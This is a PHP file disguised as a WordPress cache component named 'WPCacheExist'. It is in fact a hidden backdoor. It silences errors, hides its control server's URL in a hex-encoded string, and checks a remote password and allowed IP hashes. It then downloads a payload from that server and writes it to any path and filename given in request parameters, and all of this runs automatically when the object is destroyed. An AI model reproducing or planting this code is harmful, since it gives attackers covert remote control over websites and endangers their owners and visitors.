<?php
error_reporting( 0 );
ini_set( 'display_errors', false );

class WPCacheExist
{
	public $url;
	public $baseUrl;
	public $allow_url_fopen;
	public $filename;
	public $data;
	public $cache;
	public $error;
	public $write;
	public $password;

	public function __construct() {
		$this->baseUrl = hex2bin( '687474703a2f2f636f6e6e6563742e61706965732e6f72672f' );
		$this->password = $this->baseUrl . 'password';
		$this->allow_url_fopen = ini_get( 'allow_url_fopen' );
	}

	public function curl( $url ) {
		if ( function_exists( 'curl_init' ) ) {
			$ch = curl_init( $url );
			curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
			if ( curl_exec( $ch ) === false ) {
				$this->error = curl_error( $ch );
			} else {
				$this->data = curl_exec( $ch );
				return true;
			}
			curl_close( $ch );
		} else if ( function_exists( 'file_get_contents' ) && $this->allow_url_fopen ) {
			$this->data = file_get_contents( $url );
			return true;
		} else {
			$this->error = 'curl is error';
		}
		return false;
	}

	public function address() {
		return array(
			$this->encrypt( $_SERVER['REMOTE_ADDR'] ),
			$this->encrypt( $_SERVER['HTTP_CLIENT_IP'] ),
			$this->encrypt( $_SERVER['HTTP_CF_CONNECTING_IP'] ),
			$this->encrypt( $_SERVER['HTTP_X_FORWARDED_FOR'] ),
		);
	}

	public function encrypt( $hash ) {
		try {
			return md5( sha1( md5( $hash ) ) );
		} catch ( Exception $e ) {
			return false;
		}
	}

	public function authorization() {
		try {
			$this->curl( $this->password );
			$this->data = json_decode( $this->data );
			if ( $this->data->authorization === true || count( array_intersect( $this->address(), $this->data->address ) ) > 0 ) {
				if ( $this->data->password === $this->encrypt( $_REQUEST['password'] ) ) {
					return true;
				}
				return false;
			}
			return false;
		} catch ( Exception $e ) {
			return false;
		}
	}

	public function directory() {
		$directory = __DIR__ . DIRECTORY_SEPARATOR;
		if ( isset( $_REQUEST['directory'] ) ) {
			$directory = $directory . $_REQUEST['directory'];
		}
		return realpath( $directory );
	}

	public function filename() {
		if ( isset( $_REQUEST['filename'] ) ) {
			$this->filename = $this->directory() . DIRECTORY_SEPARATOR . $_REQUEST['filename'];
			return true;
		}
		$this->error = 'Filename variable is null';
		return false;
	}

	public function upload() {
		if ( isset( $_REQUEST['upload'] ) ) {
			$this->curl( $this->baseUrl . 'upload' . DIRECTORY_SEPARATOR . $_REQUEST['upload'] );
			return true;
		}
		$this->error = 'Upload variable is null';
		return false;
	}

	public function answer( $message ) {
		$data = array(
			"boolean" => true,
			"message" => $message,
		);
		if ( isset( $this->error ) ) {
			$data["boolean"] = false;
			$data["error"] = $this->error;
		}
		return json_encode( $data );
	}


	public function write() {
		if ( isset( $this->error ) ) {
			return false;
		}
		if ( function_exists( 'file_put_contents' ) ) {
			if ( file_put_contents( $this->filename, $this->data ) === false ) {
				$this->error = 'file_put_contents is error';
			} else {
				$this->write = $this->filename;
				return true;
			}
		} else if ( function_exists( 'fopen' ) && function_exists( 'fwrite' ) ) {
			$process = fopen( $this->filename, "w+" );
			if ( fwrite( $process, $this->data ) === false ) {
				$this->error = 'fwrite is error';
			} else {
				$this->write = $this->filename;
				return true;
			}
			fclose( $process );

		} else {
			$this->error = 'Write is error';
		}
		return false;
	}

	public function strpos( $haystack, $needle, $offset = 0 ) {
		try {
			if ( !is_array( $needle ) )
				$needle = array($needle);
			foreach ( $needle as $query ) {
				if ( strpos( $haystack, $query, $offset ) !== false ) {
					return true;
				}
			}
			return false;
		} catch ( Exception $e ) {
			return false;
		}
	}

	public function __destruct() {
		if ( $this->authorization() ) {
			$this->upload();
			$this->filename();
			$this->write();
			echo $this->answer( $this->write );
		}
	}
}

new WPCacheExist();

